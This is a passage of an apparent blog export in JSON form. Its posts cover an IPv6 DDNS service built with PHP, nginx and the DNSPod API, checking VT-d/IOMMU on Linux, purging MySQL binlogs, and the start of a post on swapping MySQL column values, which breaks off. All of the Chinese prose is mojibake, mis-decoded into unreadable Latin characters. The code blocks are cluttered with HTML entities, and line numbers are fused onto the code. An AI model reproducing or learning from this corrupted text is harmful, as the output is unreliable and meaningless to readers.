NodeJS ç›¸å…³ï¼Œé¡ºæ‰‹è€Œå·²ï¼‰ å„è®¾å¤‡ä¸Šç”¨ cron æˆ– while + sleep å®šæ—¶ï¼ˆç¬”è€…è®¾å®šçš„æ˜¯1åˆ†é’Ÿï¼‰å…ˆä» api6.ipify.org è·å–æœ¬æœº IPv6åœ°å€ å†å‘è¯¥ ddnsä»£ç†æœåŠ¡ æäº¤ã€‚ Perfectï¼ ç¬¬ä¸‰ç‰ˆæ–¹æ¡ˆç¬¬äºŒç‰ˆ æ–¹æ¡ˆç”¨çš„æŒºèˆ’å¿ƒçš„ï¼Œä½†æ˜¯è¿è¡Œäº†ä¸€æ®µæ—¶é—´å‘ç°ï¼Œå‡ºé—®é¢˜äº†ï¼Œæˆ‘å¥½å¤šè®¾å¤‡éƒ½æ¯åˆ†é’Ÿè¯·æ±‚ä¸€æ¬¡ï¼Œè¿˜æŒºé¢‘ç¹çš„ï¼Œå¯¼è‡´ api6.ipify.org é™æµï¼Œæ‹’ç»è¿”å›ã€‚ æ¢ç”¨å…¶ä»–çš„ IPv6åœ°å€æŸ¥è¯¢æœåŠ¡ï¼Œä¹Ÿéƒ½ä¸€æ ·ï¼Œéš”ä¸€æ®µæ—¶é—´å°±å¯èƒ½è¢«é™æµã€‚ æ‰€ä»¥ç¬”è€…èŒç”Ÿäº†è‡ªå·±å†™ä¸€ä¸ª IPv6åœ°å€æŸ¥è¯¢æœåŠ¡ï¼Œåªä¸ºè‡ªå·±æä¾›æœåŠ¡ï¼Œé™ä¸é™æµæˆ‘è‡ªå·±è¯´äº†ç®—ï¼ è¿™å›ä¸ºäº†é€ è½®å­èƒ½é€ çš„å¿«ç‚¹ï¼Œæ”¾å¼ƒäº† NodeJS æ”¹ç”¨äº† PHPï¼Œç›´æ¥ä¸Šä»£ç ï¼š PHP ä»£ç  1234$ cat &#x2F;home&#x2F;chaos&#x2F;IPChecker&#x2F;index.php&lt;?phpecho $_SERVER[&#39;REMOTE_ADDR&#39;]; Nginx é…ç½®æ–‡ä»¶ 123456789101112131415$ cat &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;ip-check.confserver &#123; server_name ip.example.com ipv6.example.com; listen 80; listen [::]:80; root &#x2F;home&#x2F;chaos&#x2F;IPChecker; location &#x2F; &#123; try_files $uri $uri&#x2F; &#x2F;index.php; fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125; æ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼ŒPHP ä»£ç å°±åªæœ‰ä¸€è¡Œä»£ç  echo $_SERVER[&#39;REMOTE_ADDR&#39;];ï¼Œå³ç›´æ¥è¾“å‡ºè¯·æ±‚çš„æ¥æºåœ°å€ï¼Œè€Œä¸”åŒæ—¶æ”¯æŒ IPv4/IPv6ï¼š curl ip.example.com è¿”å› IPv4 å…¬ç½‘åœ°å€ curl ipv6.example.com è¿”å› IPv6 å…¬ç½‘åœ°å€ ï¼ˆæ³¨ï¼šè¯¥æœåŠ¡åªèƒ½éƒ¨ç½²åœ¨æœ‰ IPv6 åœ°å€çš„äº‘ä¸»æœºä¸Šï¼Œå› ä¸º IPv6 åªèƒ½è®¿é—® IPv6ï¼‰ ç¬¬å››ç‰ˆæ–¹æ¡ˆå®Œæˆä¸€æ¬¡ ddnsï¼Œè¦å…ˆä» ipv6.chaosjohn.com è·å– IPv6åœ°å€ï¼Œå†å‘ ddnsä»£ç†æœåŠ¡ æäº¤ï¼Œå¾—ä¸¤æ­¥æ“ä½œï¼Œå¤ªéº»çƒ¦äº†ã€‚ æ‰€ä»¥ç¬”è€…å†³å®šæŠŠä¸¤é¡¹æœåŠ¡åˆäºŒä¸ºä¸€ï¼Œä¾æ—§åºŸè¯ä¸å¤šè¯´ï¼Œä¸Šä»£ç ï¼š é¡¹ç›®æ ¹ç›®å½• 12345678910111213141516$ ls -alh &#x2F;home&#x2F;chaos&#x2F;ddns-dnspodtotal 88Kdrwxrwxr-x 4 chaos chaos 4.0K Nov 3 06:57 .drwxr-xr-x 23 chaos chaos 4.0K Dec 16 15:30 ..-rw-rw-r-- 1 chaos chaos 75 Nov 2 09:24 composer.json-rw-rw-r-- 1 chaos chaos 2.7K Nov 2 09:24 composer.lock-rw-rw-r-- 1 chaos chaos 71 Nov 3 01:46 config.ini-rw-rw-r-- 1 chaos chaos 53 Nov 3 05:54 config-sample.inidrwxrwxr-x 8 chaos chaos 4.0K Nov 3 06:57 .git-rw-rw-r-- 1 chaos chaos 524 Nov 3 05:57 .gitignore-rw-rw-r-- 1 chaos chaos 2.7K Nov 3 02:59 index.php-rw-rw-r-- 1 chaos chaos 35K Nov 3 06:02 LICENSE-rw-r--r-- 1 chaos chaos 358 Nov 2 14:04 nginx.conf-rw-r--r-- 1 chaos chaos 362 Nov 3 05:53 nginx-sample.conf-rw-rw-r-- 1 chaos chaos 941 Nov 3 06:57 README.mddrwxrwxr-x 4 chaos chaos 4.0K Nov 2 09:24 vendor é…ç½®æ–‡ä»¶ï¼ˆå…¶ä¸­ token æ˜¯ DNSPod å¯†é’¥ç®¡ç†é‡Œçš„ ID,tokenï¼Œå½¢å¦‚ 30345,ac0000000918368b1cfa16f4fc6e28cdï¼‰ 1234$ cat &#x2F;home&#x2F;chaos&#x2F;ddns-dnspod&#x2F;config.ini[config]token &#x3D; &#39;YOUR-DNSPOD-TOKEN&#39;key &#x3D; &#39;YOUR-KEY&#39; PHP ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879$ cat &#x2F;home&#x2F;chaos&#x2F;ddns-dnspod&#x2F;index.php&lt;?phprequire __DIR__ . &#39;&#x2F;vendor&#x2F;autoload.php&#39;;use Curl\\Curl;$curl &#x3D; new Curl();$ini_array &#x3D; parse_ini_file(&#39;config.ini&#39;, true);$token &#x3D; $ini_array[&#39;config&#39;][&#39;token&#39;]; &#x2F;&#x2F; dnspod token$required_key &#x3D; $ini_array[&#39;config&#39;][&#39;key&#39;];&#x2F;&#x2F;echo $_SERVER[&#39;HTTP_X_REAL_IP&#39;];$address &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];$isIPv6 &#x3D; strpos($address, &#39;:&#39;) &gt; -1;$type &#x3D; $isIPv6 ? &#39;AAAA&#39; : &#39;A&#39;;$domain &#x3D; $_GET[&#39;domain&#39;];$sub &#x3D; $_GET[&#39;sub&#39;];$key &#x3D; $_GET[&#39;key&#39;];if (!$domain || !$sub || 0 !&#x3D; strcmp($key, $required_key)) exit;$output &#x3D; [ &#39;domain&#39; &#x3D;&gt; $domain, &#39;sub&#39; &#x3D;&gt; $sub, &#39;type&#39; &#x3D;&gt; $type, &#39;address&#39; &#x3D;&gt; $address];$form &#x3D; &quot;login_token&#x3D;$&#123;token&#125;&amp;format&#x3D;json&amp;domain&#x3D;$&#123;domain&#125;&amp;sub_domain&#x3D;$&#123;sub&#125;&amp;record_type&#x3D;$&#123;type&#125;&amp;record_line_id&#x3D;0&quot;;$response &#x3D; $curl-&gt;post(&#39;https:&#x2F;&#x2F;dnsapi.cn&#x2F;Record.List&#39;, $form);if ($curl-&gt;error) &#123; $output[&#39;msg&#39;] &#x3D; &#39;Record.List Error&#39; . $curl-&gt;errorCode . &#39;: &#39; . $curl-&gt;errorMessage . &quot;\\n&quot;;&#125; else &#123; $records &#x3D; $response-&gt;records; if (null &#x3D;&#x3D; $records) $records &#x3D; []; $records &#x3D; array_filter($records, function($record) use($type) &#123; return 0 &#x3D;&#x3D; strcmp($record-&gt;type, $type); &#125;); if (count($records) &gt; 0) &#123; &#x2F;&#x2F; if record exists $record &#x3D; $records[0]; if (0 &#x3D;&#x3D; strcmp($record-&gt;value, $address)) &#123; &#x2F;&#x2F; skip if same $output[&#39;msg&#39;] &#x3D; &#39;Same record. Skipped&#39;; echo json_encode($output); exit; &#125; &#x2F;&#x2F; update record $record_id &#x3D; $record-&gt;id; $form &#x3D; &quot;login_token&#x3D;$&#123;token&#125;&amp;format&#x3D;json&amp;domain&#x3D;$&#123;domain&#125;&amp;record_id&#x3D;$&#123;record_id&#125;&amp;sub_domain&#x3D;$&#123;sub&#125;&amp;value&#x3D;$&#123;address&#125;&amp;record_type&#x3D;$&#123;type&#125;&amp;record_line_id&#x3D;0&quot;; $response &#x3D; $curl-&gt;post(&#39;https:&#x2F;&#x2F;dnsapi.cn&#x2F;Record.Modify&#39;, $form); if ($curl-&gt;error) &#123; $output[&#39;msg&#39;] &#x3D; &#39;Record.Modify Error&#39; . $curl-&gt;errorCode . &#39;: &#39; . $curl-&gt;errorMessage . &quot;\\n&quot;; &#125; else &#123; if (null !&#x3D; $response-&gt;status &amp;&amp; null !&#x3D; $response-&gt;status-&gt;code &amp;&amp; &#39;1&#39; &#x3D;&#x3D; $response-&gt;status-&gt;code) &#123; $output[&#39;msg&#39;] &#x3D; &#39;Modification succeeded&#39;; &#125; else &#123; $output &#x3D; $response; $output-&gt;action &#x3D; &#39;Record.Modify&#39;; &#125; &#125; &#125; else &#123; &#x2F;&#x2F; record not exists &#x3D;&gt; create $form &#x3D; &quot;login_token&#x3D;$&#123;token&#125;&amp;format&#x3D;json&amp;domain&#x3D;$&#123;domain&#125;&amp;sub_domain&#x3D;$&#123;sub&#125;&amp;record_type&#x3D;$&#123;type&#125;&amp;record_line_id&#x3D;0&amp;value&#x3D;$&#123;address&#125;&quot;; $response &#x3D; $curl-&gt;post(&#39;https:&#x2F;&#x2F;dnsapi.cn&#x2F;Record.Create&#39;, $form); if ($curl-&gt;error) &#123; $output[&#39;msg&#39;] &#x3D; &#39;Record.Create Error&#39; . $curl-&gt;errorCode . &#39;: &#39; . $curl-&gt;errorMessage . &quot;\\n&quot;; &#125; else &#123; if (null !&#x3D; $response-&gt;status &amp;&amp; null !&#x3D; $response-&gt;status-&gt;code &amp;&amp; &#39;1&#39; &#x3D;&#x3D; $response-&gt;status-&gt;code) &#123; $output[&#39;msg&#39;] &#x3D; &#39;Creation succeeded&#39;; &#125; else &#123; $output &#x3D; $response; $output-&gt;action &#x3D; &#39;Record.Create&#39;; &#125; &#125; &#125;&#125;echo json_encode($output, JSON_UNESCAPED_UNICODE); Nginx é…ç½®æ–‡ä»¶ 123456789101112131415$ cat &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;ddns-dnspod.confserver &#123; server_name ddns.example.com ddns6.example.com; listen 80; listen [::]:80; root &#x2F;home&#x2F;chaos&#x2F;ddns-dnspod; location &#x2F; &#123; try_files $uri $uri&#x2F; &#x2F;index.php; fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125; å…·ä½“ä½¿ç”¨ï¼š æœ‰ cron çš„è¯ï¼Œåœ¨ crontab é‡Œæ·»åŠ ä¸€è¡Œï¼š1* * * * * logfile&#x3D;&#39;&#x2F;tmp&#x2F;ddns6.log&#39;; echo &quot;\\n$(date)&quot; &gt;&gt; $logfile &amp;&amp; curl &#39;http:&#x2F;&#x2F;ddns6.example.com?key&#x3D;YOUR-KEY&amp;domain&#x3D;DOMAIN&amp;sub&#x3D;SUBDOMAIN&#39; &gt;&gt; $logfile æ—  cron çš„è¯ï¼Œä½¿ç”¨ while + sleep1while true; do logfile&#x3D;&#39;&#x2F;tmp&#x2F;ddns6.log&#39;; echo &quot;\\n$(date)&quot; &gt;&gt; $logfile &amp;&amp; curl &#39;http:&#x2F;&#x2F;ddns6.example.com?key&#x3D;YOUR-KEY&amp;domain&#x3D;DOMAIN&amp;sub&#x3D;SUBDOMAIN&#39; &gt;&gt; $logfile; sleep 1; done å¦‚æœæ²¡æœ‰ curlï¼Œåªæœ‰ wget çš„è¯ï¼Œå°† curl [url] æ›¿æ¢ä¸º wget -q -O - [url] ä»£ç ç¬”è€…å·²ç»ä¸Šä¼ åˆ° Githubï¼Œå¦‚ä½•éƒ¨ç½²è¯·ç§»æ­¥ ChaosJohn/ddns-dnspod å‚è€ƒå“ˆï¼ˆå–œæ¬¢çš„è¯ç»™ä¸ª Star å‘—ï¼‰ æœ€åæ‰€æœ‰è”ç½‘è®¾å¤‡éƒ½å¯éšæ—¶éšåœ°è®¿é—® è¿™ä¸ªæ¢¦æƒ³æœ€ç»ˆé€šè¿‡ IPv6 å®Œç¾è¾¾æˆäº†ã€‚ æœŸé—´ç»å†äº†å¤šä¸ªæ–¹æ¡ˆï¼Œç»ˆäºåœ¨ æŠ˜è…¾ä¹‹è·¯ ä¸Šå‘Šä¸€æ®µè½äº†ã€‚ å¦‚æœåæœŸæœ‰æ›´ä¼˜è§£ï¼Œç¬”è€…è¿˜ä¼šå›æ¥çš„ï¼ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"ddns","slug":"ddns","permalink":"https://blog.chaosjohn.com/tags/ddns/"}]},{"title":"Linux ä¸‹æ£€æŸ¥ VT-d / IOMMU æ˜¯å¦å¼€å¯","slug":"Check-VT-D-or-IOMMU-under-Linux","date":"2020-12-15T12:43:47.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Check-VT-D-or-IOMMU-under-Linux.html","link":"","permalink":"https://blog.chaosjohn.com/Check-VT-D-or-IOMMU-under-Linux.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ ä»‹ç»VT-d å’Œ IOMMU å…¶å®éƒ½æ˜¯æŒ‡çš„ I/O è™šæ‹ŸåŒ–ï¼Œåªä¸è¿‡å‰è€…æ˜¯ Intel çš„å«æ³•ï¼Œåè€…æ˜¯ AMD çš„å«æ³•ï¼š VT-d å…¨ç§°ä¸º IntelÂ® Virtualization Technology for Directed I/O IOMMU å…¨ç§°ä¸º Input/Output Memory Management Unit è¿™é¡¹æŠ€æœ¯æ˜¯å¯ä»¥è®©PCI-eè®¾å¤‡çš„èµ„æºç›´æ¥åˆ†é…ç»™è™šæ‹Ÿæœºï¼Œå³ PCIç›´é€šã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨è™šæ‹Ÿå®¢æˆ·æœºé‡Œå¯ä»¥ç›´æ¥è®¿é—®åˆ°ç‰©ç†æ˜¾å¡ï¼Œæ€§èƒ½æ¯”ä½¿ç”¨ç”± VMM/Hypervisor è™šæ‹Ÿå‡ºæ¥çš„æ˜¾å¡å¥½å¾ˆå¤šï¼Œå¹¶ä¸”è¿˜æ”¯æŒ æ˜¾å¡åŠ é€Ÿã€‚ åœ¨ Linux ä¸‹æ£€æŸ¥æ˜¯å¦å¼€å¯ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨ä¸»æ¿çš„ BIOS/UEFI é‡Œï¼Œèƒ½æ‰¾åˆ° VT-d / IOMMU çš„è®¾ç½®é¡¹ï¼Œè®¾ä¸ºå¼€å¯å³å¯ã€‚ ä½†æ˜¯ä¹Ÿæœ‰ç‰¹æ®Šæƒ…å†µï¼ŒæŸäº›ä¸»æ¿é‡Œæ˜¯æ‰¾ä¸åˆ°è¯¥é¡¹è®¾ç½®çš„ï¼Œè¿™é‡Œåˆ†ä¸¤ç§æƒ…å†µï¼š ä¸»æ¿ç¡¬ä»¶æˆ–å›ºä»¶ä¸æ”¯æŒ I/O è™šæ‹ŸåŒ– ä¸»æ¿åˆ·å…¥äº†é˜‰å‰²ç‰ˆçš„å›ºä»¶ï¼Œä½†æ˜¯å®é™…ä¸Š VT-d / IOMMU æ˜¯è¢«å¯ç”¨çš„ é‚£å¦‚æœåœ¨ Linux ä¸‹å¦‚ä½•æ£€æŸ¥æ˜¯å¦å¼€å¯å‘¢ï¼Ÿ å¦‚æœ VT-d / IOMMU è¢«å¯ç”¨ï¼ŒLinux åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ä¼šé…ç½® DMAé‡æ˜ å°„ï¼Œæ‰€ä»¥ç®€å•çš„æ–¹æ³•æ˜¯åœ¨ dmesg é‡ŒæŸ¥æ‰¾ DMAR ç›¸å…³é¡¹ã€‚ åœ¨å·²å¼€å¯çš„æœºå­ä¸Šï¼š 12345678910111213# dmesg | grep DMAR[ 0.000000] ACPI: DMAR 0x00000000BBECB000 0000A8 (v01 LENOVO TP-R0D 00000930 PTEC 00000002)[ 0.001000] DMAR: Host address width 39[ 0.001000] DMAR: DRHD base: 0x000000fed90000 flags: 0x0[ 0.001000] DMAR: dmar0: reg_base_addr fed90000 ver 1:0 cap 1c0000c40660462 ecap 19e2ff0505e[ 0.001000] DMAR: DRHD base: 0x000000fed91000 flags: 0x1[ 0.001000] DMAR: dmar1: reg_base_addr fed91000 ver 1:0 cap d2008c40660462 ecap f050da[ 0.001000] DMAR: RMRR base: 0x000000bbdd8000 end: 0x000000bbdf7fff[ 0.001000] DMAR: RMRR base: 0x000000bd000000 end: 0x000000bf7fffff[ 0.001000] DMAR-IR: IOAPIC id 2 under DRHD base 0xfed91000 IOMMU 1[ 0.001000] DMAR-IR: HPET id 0 under DRHD base 0xfed91000[ 0.001000] DMAR-IR: Queued invalidation will be enabled to support x2apic and Intr-remapping.[ 0.002000] DMAR-IR: Enabled IRQ remapping in x2apic mode è§‚å¯Ÿæœ€åä¸€è¡Œï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼ DMAR-IR: Enabled IRQ remapping in xxxxx mode çš„è¾“å‡º åœ¨æœªå¼€å¯çš„æœºå­ä¸Šï¼š 12# dmesg | grep DMAR# ä»€ä¹ˆè¾“å‡ºéƒ½æ²¡æœ‰ï¼Œå³æ²¡æœ‰æ‰¾åˆ°ä»»ä½•ä¸ DMAR ç›¸å…³çš„é¡¹ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[]},{"title":"åˆ é™¤/æ¸…ç† MySQL çš„ binlog","slug":"Delete-binlog-in-MySQL","date":"2020-12-14T08:43:16.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Delete-binlog-in-MySQL.html","link":"","permalink":"https://blog.chaosjohn.com/Delete-binlog-in-MySQL.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ èƒŒæ™¯ä»Šå¹´å¹´ä¸­çš„æ—¶å€™ï¼Œæˆ‘å¸å’Œè…¾è®¯è¾¾æˆäº†ä¸€é¡¹æ·±åº¦åˆä½œï¼Œæ¶‰åŠåˆ°çš„æ•°æ®é‡è¿˜æŒºå¤§çš„ã€‚æœä¸å…¶ç„¶ï¼Œè°ˆä¸‹åˆä½œåè´Ÿè´£å®æ–½çš„è¿˜æ˜¯æˆ‘è¿™ä¸ªâ€œä»€ä¹ˆéƒ½å¹²å¸ä»¤â€ã€‚ å…·ä½“æµç¨‹ï¼š ä»æˆ‘å¸å·²æœ‰äº§å“ä¸­ï¼Œç­›å‡ºä¸€éƒ¨åˆ†æ•°æ® æ•°æ®æ¸…ç† å¤„ç†æˆé€šç”¨æ ¼å¼ï¼ˆå› ä¸ºè€æ¿è¯´åç»­ä¸ä»…ä»…åªè·Ÿè…¾è®¯åˆä½œï¼‰ è¾“å‡ºç»™è…¾è®¯ï¼ˆå®æ—¶å¤„ç†æˆè…¾è®¯æ–¹éœ€è¦çš„æ ¼å¼ï¼‰å¹¶ä¸”è®°å½•è¾“å‡ºæ—¶é—´åœ¨æœ¬åœ° å› ä¸ºæ•°æ®æ¸…ç†+å¤„ç†æ¯”è¾ƒè´¹æ—¶é—´å’Œç©ºé—´ï¼Œæ‰€ä»¥æœ¬åœ°ä¸´æ—¶æäº†ä¸€å°é«˜æ€§èƒ½å°å¼æœºä½œä¸ºæœåŠ¡å™¨ï¼ˆæ˜¯çš„ï¼Œæœ¬â€œä»€ä¹ˆéƒ½å¹²å¸ä»¤â€è¿˜è´Ÿè´£ç»„è£…ç”µè„‘ï¼‰ï¼Œé…ç½®ï¼š CPU: AMD Ryzen 5 3600 MEM: 32GB SSD: 1TB é—®é¢˜è¿˜å¤„åœ¨æ•°æ®æ¸…ç†å’Œå¤„ç†çš„æµç¨‹ä¸­ï¼Œçªç„¶å‘ç°ç¨‹åºè„šæœ¬å¼‚å¸¸é€€å‡ºäº†ã€‚ é€šè¿‡æ’æŸ¥å‘ç°ï¼Œ1TBçš„ç£ç›˜ï¼Œå±…ç„¶æ»¡äº†ï¼Œå®šä½åˆ° /var/lib/mysql è·¯å¾„ä¸‹ï¼Œå‘ç°äº†å¤§é‡çš„ binlog.xxxxxxx æ–‡ä»¶ï¼Œé€šè¿‡ ncdu åˆ†æå‡ºå®ƒä»¬å æ®äº†å¤§å‡ ç™¾GBçš„ç£ç›˜ç©ºé—´ã€‚ ï¼ˆå½“æ—¶å¤„ç†é—®é¢˜ä¹‹å‰æ²¡æœ‰æˆªå›¾ï¼Œæ‰€ä»¥åªèƒ½æˆªå‡ å¼ å†™æœ¬æ–‡æ—¶çš„å›¾äº†ï¼Œè€Œå†™æœ¬æ–‡æ—¶ï¼Œåˆä½œå·²ç»å¤„äºæœ€åçš„è¾“å‡ºæµç¨‹äº†ï¼Œæ‰€ä»¥æ•°æ®åº“ å†™æ“ä½œ åªä¸ è®°å½•è¾“å‡ºæ—¶é—´ ç›¸å…³ï¼Œæ•°æ®é‡å°äº†å¾ˆå¤šï¼‰ åŸå› binlog æ˜¯è®°å½•æ‰€æœ‰æ•°æ®åº“è¡¨ç»“æ„å˜æ›´ï¼ˆä¾‹å¦‚CREATEã€ALTER TABLEâ€¦ï¼‰ä»¥åŠè¡¨æ•°æ®ä¿®æ”¹ï¼ˆINSERTã€UPDATEã€DELETEâ€¦ï¼‰çš„äºŒè¿›åˆ¶æ—¥å¿—ã€‚ binlog ä¸ä¼šè®°å½•SELECTå’ŒSHOWè¿™ç±»æ“ä½œï¼Œå› ä¸ºè¿™ç±»æ“ä½œå¯¹æ•°æ®æœ¬èº«å¹¶æ²¡æœ‰ä¿®æ”¹ï¼Œä½†ä½ å¯ä»¥é€šè¿‡æŸ¥è¯¢é€šç”¨æ—¥å¿—æ¥æŸ¥çœ‹MySQLæ‰§è¡Œè¿‡çš„æ‰€æœ‰è¯­å¥ã€‚ äºŒè¿›åˆ¶æ—¥å¿—åŒ…æ‹¬ä¸¤ç±»æ–‡ä»¶ï¼šäºŒè¿›åˆ¶æ—¥å¿—ç´¢å¼•æ–‡ä»¶ï¼ˆæ–‡ä»¶ååç¼€ä¸º .indexï¼‰ç”¨äºè®°å½•æ‰€æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒäºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶ï¼ˆæ–‡ä»¶ååç¼€ä¸º .00000*ï¼‰è®°å½•æ•°æ®åº“æ‰€æœ‰çš„DDLå’ŒDML(é™¤äº†æ•°æ®æŸ¥è¯¢è¯­å¥)è¯­å¥äº‹ä»¶ã€‚ æ‰€ä»¥ç®€å•ç‚¹æè¿°ï¼Œæ•°æ®åº“ å†™æ“ä½œ è¶Šå¤šè¶Šé¢‘ç¹ï¼Œbinlog è®°å½•çš„è¶Šå¤šï¼Œç”šè‡³å‡ºç°ç¬”è€…é‡åˆ°çš„ çˆ†ç‚¸å¢é•¿ã€‚ è§£å†³æ—¢ç„¶ binlog æ˜¯æ—¥å¿—ï¼Œåªè¦ç¡®ä¿ï¼ˆæˆ–è€…â€œå‡è£…ç¡®ä¿â€ï¼‰è¿‡å»çš„æ“ä½œéƒ½æ­£ç¡®ï¼Œå’±ä¹Ÿæ²¡æœ‰ ä» binlog æ¢å¤æ•°æ® çš„éœ€æ±‚ï¼Œé‚£å°±åˆ äº†å‘—ã€‚ æ‰‹åŠ¨åˆ é™¤ç›´æ¥åœ¨ /var/lib/mysql è·¯å¾„ä¸‹ï¼Œå°† binlog.0* åˆ é™¤æ‰ï¼ˆæ³¨æ„ä¸è¦åˆ é™¤ binlog.indexï¼‰ è¯¥æ–¹æ³•ä¸æ¨èï¼Œå› ä¸ºæ‰‹åŠ¨åˆ é™¤å¹¶ä¸ä¼šæ›´æ–° binlog.indexï¼Œè€Œ binlog.index çš„ä½œç”¨æ˜¯åŠ å¿«æŸ¥æ‰¾ binlog æ–‡ä»¶çš„é€Ÿåº¦ã€‚ åˆ é™¤æŒ‡å®šç¼–å·ä¹‹å‰çš„ binlog12mysql&gt; PURGE MASTER LOGS TO &#39;binlog.000860&#39;;Query OK, 0 rows affected (0.01 sec) åˆ é™¤æŒ‡å®šæ—¥æœŸä¹‹å‰çš„ binlog12mysql&gt; PURGE MASTER LOGS BEFORE &#39;2020-11-11 11:11:11&#39;;Query OK, 0 rows affected (0.19 sec) æ¸…ç©ºæ‰€æœ‰ binlog12mysql&gt; RESET MASTER;Query OK, 0 rows affected (0.09 sec) é…ç½®è‡ªåŠ¨æ¸…ç†1mysql&gt; set global expire_logs_days&#x3D;7; åˆ™åªä¿ç•™7å¤©å†…çš„ binlog æ–‡ä»¶ã€‚ æˆ–è€…ä¿®æ”¹ MySQL é…ç½®æ–‡ä»¶ï¼Œè®¾ç½® expire_logs_days=7 ç„¶åé‡å¯æœåŠ¡ï¼Œå³å¯æ°¸ä¹…ç”Ÿæ•ˆã€‚ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.chaosjohn.com/tags/MySQL/"}]},{"title":"MySQL äº¤æ¢ä¸¤åˆ—å€¼","slug":"Swap-column-values-in-MySQL","date":"2020-12-13T12:16:41.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Swap-column-values-in-MySQL.html","link":"","permalink":"https://blog.chaosjohn.com/Swap-column-values-in-MySQL.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€ä»Šå¹´äº”æœˆä¸‹æ—¬çš„æ—¶å€™ï¼Œå…¬å¸æŸçº¿ä¸Šæ•°æ®åº“é­é‡è¡¨è¢«åˆ äº‹ä»¶ï¼Œå¯¹ï¼Œæ²¡é”™ï¼Œå°±æ˜¯é‚£ç§ åˆ åº“ äº‹ä»¶ã€‚ ä¸è¿‡ä¸æ˜¯æ¶æ„åˆ åº“äº‹ä»¶ï¼Œæ˜¯æŸå¼€å‘ç«¥é‹çš„ä¸å°å¿ƒï¼Œè€Œä¸”ä»–ä¹Ÿæ²¡æœ‰è·‘è·¯ã€‚ åœ¨å‘ç°è¡¨è¢«åˆ çš„ç¬¬ä¸€æ—¶é—´ï¼Œæˆ‘å°±æ’æ‰‹å¤„ç†ï¼ˆå‡è®¾è¡¨åä¸º sampleï¼‰ï¼š å…ˆæŠŠè¢«åˆ çš„è¡¨ç»“æ„é‡å»ºèµ·æ¥ï¼Œå…ˆäº‰å–çº¿ä¸Šç›¸å…³ä¸šåŠ¡æ¥å£ä¸å†æŠ¥ 502 é”™è¯¯ å†ä»é˜¿é‡Œäº‘é‚£è¾¹ä¸‹è½½å½“æ—¥æ—©äº›æ—¶å€™çš„å®Œæ•´æ•°æ®åº“å¤‡ä»½ åˆ›å»ºæœ¬åœ° MySQL ç¯å¢ƒï¼Œå°†è¢«åˆ è¡¨ä»å®Œæ•´å¤‡ä»½ä¸­æ¢å¤åˆ°æœ¬åœ° ç­‰åˆ°ä¸šåŠ¡é«˜å³°è¿‡å»åï¼ŒçŸ­æš‚ä¸‹çº¿ sample è¡¨ç›¸å…³çš„æœåŠ¡ï¼Œå³ æœåŠ¡é™çº§ å°†çº¿ä¸Š sample è¡¨çš„æ•°æ®å¯¼å‡ºåˆ° CSV æ–‡ä»¶ï¼ˆåŒ…å«äº†ä»åˆ åº“åé‡å»ºè¡¨å¼€å§‹åˆ°æœåŠ¡é™çº§ä¹‹é—´çš„æ‰€æœ‰æ•°æ®ï¼‰ ä» CSV ä¸­åˆå¹¶å¢é‡æ•°æ®åˆ°æœ¬åœ° sample è¡¨ï¼ˆè¿½åŠ åœ¨å°¾éƒ¨ï¼‰ å°†çº¿ä¸Š sample è¡¨å¤‡ä»½ååˆ é™¤ï¼Œå°†æœ¬åœ° sample è¡¨å¤åˆ¶åˆ°çº¿ä¸Š æ¢å¤æœåŠ¡ å®Œç¾æ”¶å·¥ï¼ï¼ï¼ åªä¸è¿‡ç¬¬äºŒå¤©åšæŠ•æ”¾çš„å°ä¼™ä¼´å‘Šè¯‰æˆ‘ï¼Œåå°æ•°æ®æœ‰é”™ä¹±ã€‚æˆ‘ä¸€æ£€æŸ¥ï¼Œå‘ç°ä¸Šè¿°çš„ æ­¥éª¤6 